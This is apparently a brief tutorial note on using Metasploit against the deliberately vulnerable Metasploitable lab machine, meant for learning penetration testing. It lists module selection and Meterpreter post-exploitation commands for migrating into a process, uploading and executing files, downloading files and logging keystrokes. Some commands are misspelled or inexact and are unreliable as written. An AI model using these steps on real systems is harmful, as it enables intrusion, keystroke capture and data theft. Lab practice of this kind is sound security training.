# Welcome to Metasploitable

The Metasploit Project is a computer security project that provides information about security vulnerabilities and aids in penetration testing and IDS signature development. It is owned by Boston, Massachusetts-based security company Rapid7 .[Difference between Metasploit and Metasploitable-Metasploit is a framework within Kali to run attacks on other systems. Metasploitable is a vulnerable system that can be used as a target for attacks and security testing.] msfgui is the Metasploit Framework Graphical User Interface. It provides the easiest way to use Metasploit, whether running locally or connecting remotely, build payloads, launch exploits, control sessions, and keep track of activity as you penetration test or just learn about security.  [ command always case sensitive ]


		
### How to install metasploit ?	
    sudo apt install metasploit-framework	
    
### search heartbleed
    grep exploit search samba/heartbleed	
    
### 13 is paylod num from grep search
    use 13	
		
### Set rhost	
    set rhost ip	
		
### show info	
    info	
		
### show payload list	
    show option	
    exploit/run	
		
## After opening a session		
		
### Inner command	
    meterpreter>  background	
		
    meterpreter> session -l	
    
### Session number
    meterpreter>  session -i s_num	
		
    eog file.jpg	

    meterpreter> migrate id(explore.exe)	
		
    meterpreter> upload file_name	
		
    meterpreter> download file_name	
		
    meterpreter> execute -f file_name	

    meterpreter> keyscan_start	

    meterpreter> keyscan_dump	
    
### if need to stop 
    meterpreter> keyscan_stop	
    
    meterpreter> 	
		

    
    
		
